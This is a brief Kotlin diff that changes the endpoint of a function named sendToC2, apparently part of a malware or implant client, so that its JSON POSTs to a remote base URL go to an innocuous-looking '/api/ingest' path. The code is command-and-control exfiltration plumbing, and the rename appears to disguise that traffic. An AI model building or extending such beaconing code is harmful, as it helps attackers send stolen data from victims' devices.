@@ -14,7 +14,7 @@ object NetworkUtils {
 
     fun sendToC2(baseUrl: String, jsonPayload: String): Boolean {
         return try {
-            val url = URL("$baseUrl/ws")
+            val url = URL("$baseUrl/api/ingest")
             val conn = url.openConnection() as HttpURLConnection
             conn.apply {
                 requestMethod = "POST"
